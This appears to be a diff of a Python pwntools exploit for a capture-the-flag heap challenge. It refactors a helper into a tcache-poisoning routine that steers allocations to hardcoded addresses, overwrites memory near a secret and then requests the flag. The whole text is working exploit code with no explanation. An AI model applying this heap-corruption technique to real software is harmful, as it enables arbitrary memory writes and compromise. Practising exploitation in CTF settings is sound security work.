@@ -26,8 +26,8 @@ def cmd(op, *args):
         p.send(b" " + enc(a))
     p.sendline()
 
-def malloc(ind, size):
-    return cmd("stand_create", ind, size, b"A")
+def malloc(ind, size, content=b"A"):
+    return cmd("stand_create", ind, size, content)
 
 def free(ind):
     return cmd("stand_delete", ind)
@@ -42,25 +42,28 @@ def puts(ind):
 
 
 # secret_addr = chall.sym["g_debug_control"] + 266
-secret_addr = 0x40630a
-print(f"secret_addr: {hex(secret_addr)}")
+secret_addr_1 = 0x406200
+secret_addr_2 = 0x40630a
+print(f"secret_addr: {hex(secret_addr_2)}")
 
 size = 128
-def null_qword(addr):
+def tcache_poison(addr, content=b"A"):
     malloc(0, size)
     malloc(1, size)
     free(0)
     free(1)
-    input("cont?")
+    # input("cont?")
     scanf(1, pack(addr - 0x8))
-    input("cont?")
+    # input("cont?")
     malloc(2, size)
-    malloc(3, size)
+    malloc(3, size, content)
     # 3 now contains secret but it gets discarded
     # malloc nulled out the second qword though
 
-null_qword(secret_addr)
-cmd("send_flag")
+tcache_poison(secret_addr_2)
+tcache_poison(secret_addr_1, b"AAAABBBBCCCC")
+input("cont?")
+cmd("send_flag CCCC")
 p.sendline(b"quit")
 
 print(end=p.recvall().decode())
